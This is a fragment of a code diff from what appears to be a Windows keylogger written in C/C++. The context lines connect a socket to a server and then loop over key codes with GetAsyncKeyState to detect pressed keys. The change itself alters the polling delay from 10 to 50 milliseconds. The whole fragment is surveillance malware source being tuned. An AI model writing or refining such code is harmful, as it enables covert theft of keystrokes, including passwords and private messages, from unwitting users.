@@ -29,7 +29,7 @@ int main() {
     connect(server, (SOCKADDR *)&addr, sizeof(addr)); ////Connect using above variables
   //https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate#return-value
     while (true) {
-        Sleep(10);
+        Sleep(50);
         for (int KEY = 0x8; KEY < 0xFF; KEY++)
         {
             if (GetAsyncKeyState(KEY) & 0x8000) {
